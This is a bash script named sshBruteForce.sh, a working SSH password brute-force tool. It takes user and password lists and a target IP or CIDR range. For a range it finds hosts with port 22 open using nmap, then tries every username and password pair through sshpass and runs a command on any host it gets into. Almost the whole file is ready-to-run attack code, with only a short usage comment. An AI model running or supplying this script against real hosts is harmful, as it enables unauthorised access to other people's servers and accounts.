#!/bin/bash

#     
#     
#     ./sshBruteForce.sh [user/user.lst] [passwords.lst] [ip/CIDR]
#     
#     Iterate through [user(s)], [passwords], & [IP(s)]
#     Variables must be passed in that order.
#     [user.lst] and [passwords.lst] must be delimited
#     by new lines or carriage returns. A single IP or
#     CIDR may be passed "${3}"
#     
#     


## Script Variables
USER="${1}"
PASSWORDS="${2}"
IP="${3}"
IP_REGEX='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
CIDR_REGEX='(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/([0-9]|[1-2][0-9]|3[0-2]))'

user_check(){
	local username
	username="${1}"
	declare -g USERS=()
	if [[ $(ls ${username} 2> /dev/null) ]]; then
		echo 'Adding list of users to array'
		declare -g USERS=( $(cat "${username}") )
	else
		echo 'Adding single user to array'
		USERS+=("${username}")	
	fi
}


password_list_check(){
	local password_list_check
	password_list_check="${1}"
	if [[ ${password_list_check:?"### Usage: ./sshBruteForce.ssh user password.lst 192.168.1.1"} ]]; then
		IFS='
		'
		declare -g PASSWORDS=( $(cat "${password_list_check}") )
	fi
}

ip_check(){
	local ip
	ip="${1}"
	declare -g IPS=()
	if [[ "${ip}" =~ ${CIDR_REGEX} ]]; then
		echo 'CIDR detected. Building Array'
		declare -g IPS=( $(nmap -p T:22 "${ip}" | grep -B3 'tcp open' | grep -Eo "${IP_REGEX}") )
	else
		if ! [[ "${ip}" =~ ${IP_REGEX} ]]; then
			echo "${ip} is not a valid IP or CIDR address"
			exit 26
		else
			echo 'Individual IP detected'
			IPS+=("${ip}")
		fi
	fi
	echo ''
}


dep_check(){
	declare -a dependencies=("nmap" "ssh" "sshpass")
	for i in "${dependencies[@]}"; do
		if [[ $(dpkg -l "${i}" > /dev/null) ]]; then
			sudo apt-get install "${i}" -y
		fi
	done
}


sshpass_iterations(){
	for ip in ${IPS[@]}; do
	  for user in ${USERS[@]}; do
	    for password in ${PASSWORDS[@]}; do
				echo "Attempting IP: ${ip} Username: ${user} Password: ${password}" && sshpass -p "${password}" ssh "${user}"@"${ip}" 2>/dev/null <<<- 'ifconfig | grep -m1 "inet "'
	    done
	  done
	done
}


user_check "${USER}"
password_list_check "${PASSWORDS}"
ip_check "${IP}"
dep_check
sshpass_iterations
